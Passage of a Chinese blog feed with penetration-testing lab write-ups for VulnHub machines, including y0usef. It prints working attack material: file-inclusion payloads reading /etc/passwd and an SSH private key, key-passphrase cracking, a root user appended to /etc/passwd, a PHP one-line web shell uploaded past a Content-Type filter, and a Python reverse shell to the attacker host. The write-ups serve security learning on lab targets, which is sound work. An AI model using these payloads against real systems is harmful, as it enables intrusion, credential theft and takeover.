+<img src="https://kekwy.oss-cn-nanjing.aliyuncs.com/post/image-20221108212228720.png" alt="image-20221108212228720" /> 
+
+<p>找到了隐藏路径 <code>/secret/</code> 和隐藏文件 <code>robots.txt</code>。</p>
+<p>分别访问均没有获得有效信息。</p>
+<p>ps：<a href="https://blog.csdn.net/qq_41092170/article/details/117701816">robots.txt</a></p>
+</li>
+<li><p>对 <code>/secret/</code> 做进一步路径爆破：</p>
+<p>直接使用 <code>dirsearch</code> 由于字典限制无法找到更多信息，此处使用 <code>gobuster</code> 进行爆破。</p>
+<blockquote>
+<p>安装：apt install gobuster</p>
+<p>安装字典：apt install seclists</p>
+<p>渗透测试要尝试掌握多种工具</p>
+</blockquote>
+<p>使用指定字典进行路径爆破：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">gobuster <span class="built_in">dir</span> -u http://10.0.2.12/secret/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-1.0.txt -x txt,php,html,jsp</span></span><br></pre></td></tr></table></figure>
+
+<img src="https://kekwy.oss-cn-nanjing.aliyuncs.com/post/image-20221108213853527.png" alt="image-20221108213853527" />  
+
+<p>除了主页文件之外，还发现一个 PHP 文件 <code>evil.php</code>。直接通过 url 访问该文件发现只有一个空白页面，猜测可能需要通过 <code>GET</code> 方法提供一个参数（即在 url 后添加某个参数）。</p>
+</li>
+</ol>
+<h3 id="0x02-参数名爆破"><a href="#0x02-参数名爆破" class="headerlink" title="0x02. 参数名爆破"></a>0x02. 参数名爆破</h3><p>使用 <code>ffuf</code> 工具对该参数键值对（参数名和对应的值）进行爆破：</p>
+<ol>
+<li><p>首先期望存在命令注入漏洞：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:PARAM  -u http://10.0.2.12/secret/evil.php?PARAM=<span class="built_in">ls</span> -fs 0</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>选择字典文件 burp-parameter-names.txt 作为参数名；</li>
+<li>命令 <code>ls</code> 作为参数值。</li>
+</ul>
+<p>进行爆破后，为获得有效结果，爆破失败。</p>
+</li>
+<li><p>期望存在文件包含漏洞：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:PARAM  -u http://10.0.2.12/secret/evil.php?PARAM=../index.html -fs 0</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>选择字典文件 burp-parameter-names.txt 作为参数名；</li>
+<li>已知存在的主页文件的路径作为参数值。</li>
+</ul>
+<img src="https://kekwy.oss-cn-nanjing.aliyuncs.com/post/image-20221108225352732.png" alt="image-20221108225352732" /> 
+
+<p>爆破成功，结果显示需要提供的参数名为 <code>command</code> 。</p>
+</li>
+<li><p>查看靶机文件验证漏洞存在：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://10.0.2.12/secret/evil.php?command=/etc/passwd</span><br></pre></td></tr></table></figure>
+
+<p>查看返回页面源码：</p>
+<img src="https://kekwy.oss-cn-nanjing.aliyuncs.com/post/image-20221108225808433.png" alt="image-20221108225808433" width=300% /> 
+
+<p>读取了靶机上的 <code>/etc/passwd</code> 文件，确认存在文件包含漏洞。</p>
+</li>
+</ol>
+<h3 id="0x03-SSH-私钥密码爆破"><a href="#0x03-SSH-私钥密码爆破" class="headerlink" title="0x03. SSH 私钥密码爆破"></a>0x03. SSH 私钥密码爆破</h3><ol>
+<li><p>通过分析上述文件内容，发现靶机中除 root 用户外还存在一个 <code>mowree</code> 用户拥有登录权限，其主目录为 <code>/home/mowree</code>.尝试获取其被允许的 SSH 登录方式：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ssh mowree@10.0.2.12 -v    <span class="comment"># debug模式</span></span></span><br></pre></td></tr></table></figure>
+
+<img src="https://kekwy.oss-cn-nanjing.aliyuncs.com/post/image-20221109091744345.png" alt="image-20221109091744345" width=300% />
+
+<p>发现除了允许输入对应密码登录外还可以使用密钥登录。</p>
+</li>
+<li><p>通过文件包含漏洞查看靶机上该用户的私钥：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://10.0.2.12/secret/evil.php?command=/home/mowree/.ssh/id_rsa</span><br></pre></td></tr></table></figure>
+
+<img src="https://kekwy.oss-cn-nanjing.aliyuncs.com/post/image-20221109092317615.png" alt="image-20221109092317615" width=300% /> 
+
+<p>将其保存在文件 <code>id_rsa</code> 中。 </p>
+</li>
+<li><p>使用指定私钥登录靶机：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># ssh mowree@10.0.2.12 -i id_rsa</span><br></pre></td></tr></table></figure>
+
+<p>发现需要输入私钥的密码：</p>
+<img src="https://kekwy.oss-cn-nanjing.aliyuncs.com/post/image-20221109093513763.png" alt="image-20221109093513763" /> 
+
+<p>考虑对其进行爆破。  </p>
+<p>如果出现报错：</p>
+<img src="https://kekwy.oss-cn-nanjing.aliyuncs.com/post/image-20221109093055156.png" alt="image-20221109093055156" /> 
+
+<p>这是说密钥文件权限不能为0644，0644权限太开放了，要求你的密钥文件不能被其它用户读取。</p>
+<p>修改权限为7000即可：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">chmod</span> 7000 id_rsa</span></span><br></pre></td></tr></table></figure>
+
+<p>参考：<a href="https://blog.csdn.net/Figure_hb/article/details/90754146">https://blog.csdn.net/Figure_hb/article/details/90754146</a></p>
+</li>
+<li><p>将密钥文件转换为 <code>john</code> 可用的 hash 文件：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># /usr/share/john/ssh2john.py ./id_rsa &gt; id_rsa.hash</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>使用 <code>john</code> 进行爆破：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">john id_rsa.hash --wordlist=rockyou.txt</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>该字典文件可通过在 kali 上使用 locate 指令搜索得到</p>
+</blockquote>
+<img src="https://kekwy.oss-cn-nanjing.aliyuncs.com/post/image-20221109094836969.png" alt="image-20221109094836969" /> 
+
+<p>成功获取私钥密码 <code>unicorn</code>。</p>
+</li>
+<li><p>成功登入靶机：</p>
+<img src="https://kekwy.oss-cn-nanjing.aliyuncs.com/post/image-20221109095933335.png" alt="image-20221109095933335" /></li>
+</ol>
+<h3 id="0x04-信息收集"><a href="#0x04-信息收集" class="headerlink" title="0x04. 信息收集"></a>0x04. 信息收集</h3><ol>
+<li><p>查看当前目录下的文件，获取第一个 Flag：</p>
+<img src="https://kekwy.oss-cn-nanjing.aliyuncs.com/post/image-20221109100516303.png" alt="image-20221109100516303" /> 
+
+<p><strong>Flag1：</strong>56Rbp0soobpzWSVzKh9YOvzGLgtPZQ</p>
+</li>
+<li><p>当前用户路径下没有其他有价值的文件，在靶机上寻找用户可以写入的文件：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">find / -perm -o+w -maxdepth 3 -<span class="built_in">print</span> | grep -v /dev| grep -v /sys | grep -v /proc | grep -v /boot | grep -v /run &gt; res.txt</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>find指令的使用：<a href="https://blog.csdn.net/m0_46674735/article/details/112390027">https://blog.csdn.net/m0_46674735/article/details/112390027</a></p>
+<p>使用find命令按权限查找文件：<a href="https://www.iplayio.cn/post/596968725">https://www.iplayio.cn/post/596968725</a></p>
+</blockquote>
+<ul>
+<li><p>-o+w：查找其他用户有写权限的文件，（由于期望目标文件所有者是 root，我们目前的用户相对 root 即为 other users）；</p>
+</li>
+<li><p>-maxdepth：从根目录开始搜索的最大深度为3；</p>
+</li>
+<li><p>-print：将输出结果写入标准输出文件；</p>
+</li>
+<li><p>grep -v &#x2F;dev| grep -v &#x2F;sys | grep -v &#x2F;proc | grep -v &#x2F;boot | grep -v &#x2F;run：</p>
+<p>忽略以上目录下的搜索结果；</p>
+</li>
+<li><p>&gt; res.txt：将标准输出重定向为 res.txt 文件，即将筛选后的搜索结果保存在该文件中。</p>
+</li>
+</ul>
+<p>查看搜索结果，发现 <code>/etc/passwd</code> 文件竟然可以被其他用户写入：</p>
+<body style="text-align:left">
+<img src="https://kekwy.oss-cn-nanjing.aliyuncs.com/post/image-20221109173321185.png" alt="image-20221109173321185" width=700/>
+</body>
+</li>
+<li><p>进一步验证：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">ls</span> /etc/passwd -al</span></span><br></pre></td></tr></table></figure>
+
+<body style="text-align:left">
+<img src="https://kekwy.oss-cn-nanjing.aliyuncs.com/post/image-20221109173503185.png" alt="image-20221109173503185" width=700 />
+</body>
+
+<p>发现我们确实具有写权限。</p>
+<p>设想如果我们在其中插入一条具有 root 权限的密码自定义的用户记录，切换到我们自定义的用户即可获取 root 权限。</p>
+</li>
+</ol>
+<h3 id="0x05-自定义-root-用户"><a href="#0x05-自定义-root-用户" class="headerlink" title="0x05. 自定义 root 用户"></a>0x05. 自定义 root 用户</h3><ol>
+<li><p>首先需要在 kali 上对我们自定义的密码进行加密。使用工具 <code>openssl</code>：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">openssl passwd</span></span><br></pre></td></tr></table></figure>
+
+<p>这里我输入的明文密码为 <code>test123</code>。<img src="https://kekwy.oss-cn-nanjing.aliyuncs.com/post/image-20221109180626629.png" alt="image-20221109180626629"> </p>
+</li>
+<li><p>使用得到的密码密文，参照 passwd 文件中 root 用户的记录自定义一条用户记录：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">test123:$1$5zwm/pYB$109Okt6Ql.GcBYi/z16xT1:0:0:root:/root:/bin/bash</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>将该记录追加在 <code>/etc/passwd</code> 文件中：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">echo</span> <span class="string">&#x27;test123:$1$5zwm/pYB$109Okt6Ql.GcBYi/z16xT1:0:0:root:/root:/bin/bash&#x27;</span> &gt;&gt; /etc/passwd</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>切换到用户 <code>test123</code>：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">su test123</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://kekwy.oss-cn-nanjing.aliyuncs.com/post/image-20221109181310735.png" alt="image-20221109181310735"> </p>
+<p>成功提权。</p>
+</li>
+<li><p>切换到 root 目录，发现第二个 Flag：</p>
+<p><img src="https://kekwy.oss-cn-nanjing.aliyuncs.com/post/image-20221109181455730.png" alt="image-20221109181455730"> </p>
+<p><strong>Flag2：</strong>36QtXfdJWvdC0VavlPIApUbDlqTsBM</p>
+</li>
+</ol>
+<h2 id="三、实验结果"><a href="#三、实验结果" class="headerlink" title="三、实验结果"></a>三、实验结果</h2><ul>
+<li><p><strong>Flag1：</strong>56Rbp0soobpzWSVzKh9YOvzGLgtPZQ</p>
+</li>
+<li><p><strong>Flag2：</strong>36QtXfdJWvdC0VavlPIApUbDlqTsBM</p>
+</li>
+<li><p><strong>root：</strong></p>
+<p><img src="https://kekwy.oss-cn-nanjing.aliyuncs.com/post/image-20221109181310735.png" alt="image-20221109181310735"></p>
+</li>
+</ul>
+<h2 id="四、总结"><a href="#四、总结" class="headerlink" title="四、总结"></a>四、总结</h2><ul>
+<li>根据发现的端口首先通过浏览器访问靶机的80端口，发现没有有效信息，考虑隐藏路径爆破；</li>
+<li>使用 <code>dirsearch</code> 爆破到存在 <code>/secret/</code> 路径，但是继续爆破无果。换用 <code>gobuster</code> 进行路径爆破，最终找到一个 PHP 文件 <code>evil.php</code>；</li>
+<li>直接访问返回空白页，推测其可能需要一个参数，使用 <code>ffuf</code> 进行参数名的爆破，最终发现存在文件包含漏洞；</li>
+<li>通过文件包含漏洞查看文件 <code>/etc/passwd</code>，发现一个可以登录的用户 <code>mowree</code>。使用 ssh 尝试登录发现该用户还支持私钥认证登录；</li>
+<li>通过文件包含漏洞获取靶机对应路径下的私钥，并使用 <code>john</code> 对私钥密码进行爆破；</li>
+<li>成功登入靶机后，发现当前用户对 <code>/etc/passwd</code> 文件具有写权限，添加一个具有 root 身份的密码自定义的用户记录；</li>
+<li>使用我们自定义的密码切换至上述自定义用户，成功获取 root 权限。</li>
+</ul>
+<h2 id="五、思路拓展"><a href="#五、思路拓展" class="headerlink" title="五、思路拓展"></a>五、思路拓展</h2><ol>
+<li><p>对于一个文件包含漏洞，可以首先尝试有没有远程文件包含漏洞，如果有即可让其执行 kali 的 web 服务上的一句话木马或反弹 shell 等攻击脚本。（本次实验中不存在该漏洞）</p>
+</li>
+<li><p>也可以考虑先编码，再通过文件包含漏洞读出编码后的 PHP 代码，可以实现避免执行代码而是读取代码的内容。这里可以尝试将 <code>evil.php</code> 读出：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://10.0.2.12/secret/evil.php?command=php://filter/convert.base64-encode/resource=evil.php</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>PD9waHAKICAgICRmaWxlbmFtZSA9ICRfR0VUWydjb21tYW5kJ107CiAgICBpbmNsdWRlKCRmaWxlbmFtZSk7Cj8+Cg==</code></li>
+</ul>
+</li>
+<li><p>通过 <a href="https://icyberchef.com/">icyberchef</a> 进行解码：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;command&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$filename</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>成功获取到 <code>evil.php</code> 的源码。</p>
+</li>
+<li><p>尝试进行写入，如果成功则可以通过此漏洞写入一句话木马脚本：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://10.0.2.12/secret/evil.php?command=php://filter/write=convert.base64-</span><br><span class="line">decode/resource=test.php&amp;txt=MTIz</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>尝试访问预期生成的文件，发现返回404，说明该方法在当前靶机上不可用。但也是一种漏洞利用的好思路。</p>
+</li>
+</ol>
+]]></content>
+      <categories>
+        <category>网络攻防实战</category>
+      </categories>
+      <tags>
+        <tag>学习</tag>
+        <tag>Kali</tag>
+        <tag>网络</tag>
+        <tag>安全</tag>
+        <tag>Linux</tag>
+        <tag>vulnhub</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>【渗透测试】第一周 vulnhub-y0usef</title>
+    <url>/vulnhub-y0usef/</url>
+    <content><![CDATA[<blockquote>
+<p>第一周</p>
+<p>可弟WZ</p>
+<p>主页：blog.kekwy.com</p>
+<p>邮箱：<a href="mailto:&#107;&#101;&#101;&#107;&#107;&#x65;&#x77;&#121;&#x40;&#113;&#x71;&#x2e;&#99;&#x6f;&#x6d;">&#107;&#101;&#101;&#107;&#107;&#x65;&#x77;&#121;&#x40;&#113;&#x71;&#x2e;&#99;&#x6f;&#x6d;</a></p>
+<p>2022年9月27日</p>
+</blockquote>
+<h2 id="一、实验准备"><a href="#一、实验准备" class="headerlink" title="一、实验准备"></a>一、实验准备</h2><p>靶机：y0usef</p>
+<p>下载链接：<a href="https://www.vulnhub.com/entry/y0usef-1,624/">https://www.vulnhub.com/entry/y0usef-1,624/</a></p>
+<p>攻击机：kali</p>
+<h2 id="二、实验目标"><a href="#二、实验目标" class="headerlink" title="二、实验目标"></a>二、实验目标</h2><p>取得目标靶机的root权限和2个flag。</p>
+<h2 id="三、实验内容"><a href="#三、实验内容" class="headerlink" title="三、实验内容"></a>三、实验内容</h2><ol>
+<li><p>在VirtualBox中同时启动kali攻击机和第三周靶机，并保证两者位于同一局域网下。</p>
+</li>
+<li><p>在kali中执行以下指令进行局域网主机发现：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo arp-scan -I eth0 -l</span></span><br></pre></td></tr></table></figure>
+
+<p>扫描结果如下：</p>
+<p><img src="https://blog.kekwy.com/media/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220921103912013.png" alt="image-20220921103912013"> </p>
+<p>可以推断<sup>1</sup>出靶机 地址为 <code>10.0.2.5</code> 。</p>
+<p><a id="jump1"></a></p>
+<p><code>1：</code> 推断方式很多，可以挨个扫描端口，可以控制变量（不开靶机扫描一次，启动靶机后再扫描一次），可以对比扫描结果与靶机的mac地址，也可以是经验之谈。</p>
+</li>
+<li><p>在kali中执行以下指令扫描靶机的端口状态：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo nmap -p- 10.0.2.5</span></span><br></pre></td></tr></table></figure>
+
+<p>扫描结果如下：</p>
+<p><img src="https://blog.kekwy.com/media/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220921083225282.png" alt="image-20220921083225282"> </p>
+<p>发现开通了22、80两个端口，提示我们可以考虑靶机上的<code>ssh</code>与<code>http</code>服务。为了进一步确定各端口的用途，我们可以通过以下指令<sup>2</sup>获取对应的服务版本信息：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo nmap -p22,80 -sV -sC 10.0.2.5</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p><a id="jump2"></a></p>
+<p><code>2:</code> <code>-p</code> 对指定端口扫描</p>
+<p>​	    <code>-sV -sC</code> 默认安全脚本扫描</p>
+<p>扫描结果如下：</p>
+<p><img src="https://blog.kekwy.com/media/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220921111148084.png" alt="image-20220921111148084"> </p>
+</li>
+<li><p>我们根据靶机开放的80端口，推测可以去网页上寻找突破口。于是在kali中打开浏览器，并输入靶机的IP，进入在靶机上运行的网站，顺便查看网站的源码：</p>
+<p><img src="https://blog.kekwy.com/media/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220921111747118.png" alt="image-20220921111747118"> </p>
+<p> 但是发现网站与其源码中均无对我们有帮助的信息，再尝试能否查看靶机上的<code>robots.txt</code>文件<sup>3</sup>：</p>
+<img src="https://blog.kekwy.com/media/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220921112049063.png" alt="image-20220921112049063" style="zoom:67%;" /> 
+
+<p>但令人遗憾的是，我们并不能查看该文件。</p>
+<p><a id="jump3"></a></p>
+<p><code>3:</code> Robots协议（也称为爬虫协议、机器人协议等）的全称是“网络爬虫排除标准”（Robots Exclusion Protocol），网站通过Robots协议告诉搜索引擎哪些页面可以抓取，哪些页面不能抓取。obots.txt文件是一个文本文件。robots.txt是搜索引擎中访问网站的时候要查看的第一个文件。robots.txt文件告诉网络爬虫在服务器上什么文件是可以被查看的。</p>
+</li>
+<li><p>使用whatweb工具查看web应用所采用的软件构架：</p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ whatweb http://10.0.2.5</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog.kekwy.com/media/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220921151941056.png" alt="image-20220921151941056"> </p>
+<p>尝试使用工具<code>dirsearch</code>爆破 web 服务端的路径，发现一些隐藏的路径和文件：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">dirsearch -u http://10.0.2.5</span></span><br></pre></td></tr></table></figure>
+
+<p>结果如下：</p>
+<img src="https://blog.kekwy.com/media/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220921091507301.png" alt="image-20220921091507301" style="zoom: 50%;" /> 
+
+<p>得知<sup>4</sup>服务器上有三个我们可以访问的文件：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/adminstration</span><br><span class="line">/index.php</span><br><span class="line">/index.php/login</span><br></pre></td></tr></table></figure>
+
+<p>其中，通过后两个文件的url进入服务器后的页面与此前相同，仍无有价值信息。</p>
+<p><a id="jump4"></a></p>
+<p><code>4:</code> HTTP的状态码可分为五大类：1xx-临时响应、2xx-成功、3xx-重定向、4xx-请求错误、5xx-服务器错误。</p>
+<p>上述结果中出现的状态码的含义分别为：</p>
+<table>
+<thead>
+<tr>
+<th>状态码</th>
+<th>含义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>403</td>
+<td>(禁止)服务器拒绝请求。</td>
+</tr>
+<tr>
+<td>301</td>
+<td>(永久移动)请求的网页已永久移动到新位置。服务器返回此响应(对 GET 或 HEAD 请求的响应)时，会自动将请求者转到新位置。</td>
+</tr>
+<tr>
+<td>200</td>
+<td>(成功)服务器已成功处理了请求。通常，这表示服务器提供了请求的网页。</td>
+</tr>
+</tbody></table>
+</li>
+<li><p>访问<code>10.0.2.5/adminstration</code>：</p>
+<p><img src="https://blog.kekwy.com/media/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220921114137208.png" alt="image-20220921114137208"> </p>
+<p>提示我们没有权限，需要进行“绕过”。这里我们采用“X系列头部绕过”的方式：</p>
+<p>启动Burp Suit并启用拦截，将浏览器代理设置为<code>127.0.0.1:8080</code>（Burp Suit的默认代理端口为8080）。</p>
+<p>刷新页面，Burp Suit弹出拦截窗口，在被拦截的数据包中加入<code>X-Forwarded-For: 127.0.0.1</code><sup>5</sup>（如下图），再将其发送。<em><strong>【后续被拦截的数据包都需要插入上述内容。】</strong></em></p>
+<p><img src="https://blog.kekwy.com/media/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220921124711969.png" alt="image-20220921124711969"> </p>
+<p>发现成功进入一个登录界面：</p>
+<p><img src="https://blog.kekwy.com/media/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220921124805448.png" alt="image-20220921124805448"> </p>
+<p>这里我们可以直接尝试一下弱口令，用户名和密码都输入admin，发现登入成功了。</p>
+<p><img src="https://blog.kekwy.com/media/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220921130249392.png" alt="image-20220921130249392">  </p>
+<p><a id="jump5"></a></p>
+<p><code>5</code>: 让靶机服务器误以为该报文是从其本地发起的，从而获取访问权限。</p>
+</li>
+<li><p>简单浏览了各个页面之后，发现没有什么直接可用的信息，但是这里的文件上传功能引起了我们的注意。</p>
+<p>首先编写一个“一句话木马”的PHP 文件<code>shell.php</code>，内容如下：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$var</span>=<span class="title function_ invoke__">shell_exec</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]); <span class="keyword">echo</span> <span class="variable">$var</span><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>尝试直接将其上传，发现网站提示文件被拒绝：</p>
+<p><img src="https://blog.kekwy.com/media/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220921130902640.png" alt="image-20220921130902640"> </p>
+<p>推测网站可能存在针对文件类型的过滤<sup>6</sup>，我们可以通过修改被拦截的报文中<code>Content-Type</code>字段的值进行绕过：</p>
+<p><img src="https://blog.kekwy.com/media/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220921131442789.png" alt="image-20220921131442789"> </p>
+<p>修改为：<code>image/png</code>：</p>
+<p><img src="https://blog.kekwy.com/media/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220921131518489.png" alt="image-20220921131518489"> </p>
+<p>文件上传成功了，并提供了上传完成的文件的URL。</p>
+<p><img src="https://blog.kekwy.com/media/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220921131734558.png" alt="image-20220921131734558"> </p>
+<p><a id="jump6"></a></p>
+<p><code>6:</code> 常见的过滤形式与绕过方法：</p>
+<ol>
+<li>针对文件扩展名的绕过：</li>
+</ol>
+<p>修改文件扩展名后，再上传。</p>
+<p>2)针对文件类型的绕过：</p>
+<p>修改报文中的<code>Content-Type</code>字段（如本次实验）。</p>
+<p>3)针对文件内容的绕过：</p>
+<p>在文件内容的前面添加上符合文件类型要求的数据，中间穿插我们的代码。</p>
+</li>
+<li><p>通过URL访问文件：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://10.0.2.5/adminstration/upload/files/1663725708shell.php</span><br></pre></td></tr></table></figure>
+
+<p>进入了一片空白的页面，说明该url正确。再尝试输入指令，测试代码是否可以正常运行：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://10.0.2.5/adminstration/upload/files/1663725708shell.php?cmd=ls</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog.kekwy.com/media/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220921133834453.png" alt="image-20220921133834453"> </p>
+<p>指令成功运行，到此为止我们就可以通过url让目标靶机执行反弹shell的代码了。首先，先试探一下靶机的语言环境：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://10.0.2.5/adminstration/upload/files/1663725708shell.php?cmd=which python</span><br></pre></td></tr></table></figure>
+
+<p>得到了靶机上的python路径，说明靶机有python环境：</p>
+<p><img src="https://blog.kekwy.com/media/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220921134349689.png" alt="image-20220921134349689"> </p>
+<p>故我们可以利用python版的反弹shell代码实现反弹shell，首先在kali上监听某一个端口（如4444端口）：</p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ nc -nvlp 4444</span><br></pre></td></tr></table></figure>
+
+<p>修改对应的python代码：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;ip&quot;,port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>其中ip修改为kali的ip，port修改为刚才设置监听的端口。本次实验中分别为10.0.2.15、4444.</p>
+<p>将修改好的代码插入上述URL中对应的参数位置（”cmd&#x3D;”之后），再次访问，发现kali的shell成功监听到靶机的反弹shell：</p>
+<img src="https://blog.kekwy.com/media/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220921140145500.png" alt="image-20220921140145500" style="zoom:67%;" /> 
+
+<p>使用以下指令对反弹shell进行一个简单的升级: </p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">python -c <span class="string">&quot;import pty; pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog.kekwy.com/media/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20220921140419911.png" alt="image-20220921140419911"> </p>
+</li>
+<li><p>查看&#x2F;etc&#x2F;passwd 文件<sup>7</sup>：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cat</span> /etc/passwd</span></span><br></pre></td></tr></table></figure>
+
+<p>注意到有以下一项：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yousef:x:1000:1000:yousef,,,:/home/yousef:/bin/bash</span><br></pre></td></tr></table></figure>
+
+<p>说明有一个叫<code>yousef</code>的用户可以登录系统<sup>8</sup>，且主目录为<code>/home/yousef</code>。</p>
